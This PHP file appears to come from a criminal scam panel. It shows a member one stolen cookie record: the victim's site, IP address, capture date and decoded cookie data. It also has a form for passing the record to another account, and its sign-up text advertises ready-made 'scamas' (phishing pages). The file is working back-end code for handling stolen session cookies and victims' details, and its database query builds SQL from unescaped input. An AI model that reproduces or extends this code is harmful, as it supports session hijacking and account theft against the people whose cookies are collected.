<?
// ################################
// #                                                             
// #  ======== Programming By supervirus ===========  
// #
// #    The Scripet Progeramed By super virus 
// #
// #  Copyright © 2011 super virus . All Rights Reserved. 
// #
// #  If you want any support vist this site.           
// #      https://www.facebook.com/l0ldz 
// #
// ################################

	if(user_level == 0){
		echo ' <div class="head_panel">.: Show Coockies Victime  :.</div>	
				<div class="body_panel">
				Soory You Must Be Member To See Your Vistimes  <br />
				Sing Up for Get Your Profisionel Scamas <br />
				<a href="?do=register">Sing Up Here</a>
				</div>';
	}else{
		$cod_sql = "SELECT * FROM ".prifex."coockies WHERE user_id_coockie = '".user_id."' AND coockie_id = '$id' AND coockie_deleted != '1'";
		$sql_select_all_info_of_visa = mysql_query($cod_sql) or die (error_sql(mysql_error(),__LINE__,__FILE__));
	 	$num_sql_victims_info = mysql_num_rows($sql_select_all_info_of_visa);
		if($num_sql_victims_info > 0){
			$row_victims_info = mysql_fetch_object($sql_select_all_info_of_visa);
			$coockie_id = $row_victims_info->coockie_id;
			$sit_url_victime = htmlspecialchars($row_victims_info->sit_url_victime);
			$coockie_data = $row_victims_info->coockie_data;
			$ip_coockies = $row_victims_info->ip_coockies;
			$date_coockie = $row_victims_info->date_coockie;
		echo '<div class="head_panel">.: Coockie\'s '.$sit_url_victime.' info   :.</div>	
				<div class="body_panel">
				<table border="1" width="100%">
				<tr class="tr3">
					<td align="center" height="32">Website Victime</td>
					<td align="center" height="32">'.$sit_url_victime.'</td>
				</tr>
				<tr class="tr1">
					<td align="center" height="32">Victime Ip</td>
					<td align="center" height="32"><b><font color="#00FF00">'.$ip_coockies.'</font></b></td>
				</tr>				
				<tr class="tr3">
					<td align="center" height="32">Date Stile</td>
					<td align="center" height="32">'.date_normal($date_coockie).'</td>
				</tr>
				<tr class="tr1">
					<td colspan="2" align="center" height="32">Coockies Data</td>
				</tr>
				<tr class="tr_data">
					<td colspan="2" height="32">'.replacerbr(base64_decode($coockie_data)).'</td>
				</tr>
				<tr class="tr1">
					<td colspan="2" height="32">
						Transfair This coockies Info To Another User Compt 
						Put Here Id Of Compt To Transfair Data And Click Transfair Button<br />
						<form method="GET" action="">
							<input class="inpt" type="text" name="id_comp" size="20">
							<input type="hidden" name="do" value="coockie" size="20">
							<input type="hidden" name="type" value="trans_coockie" size="20">
							<input type="hidden" name="coockie_info_id" value="'.$id.'" size="20">
							<input class="inpt" type="submit" value="Transfair" >
						</form>
					</td>
				</tr></table>
		</div>';
		}else{
		echo '<div class="head_panel">.: Show Visas Victime  :.</div>	
				<div class="body_panel">
				There coockies Info Id Are Wrong Or IS Transfaired Or Deleted 
				</div>';
		}
	}

	
?>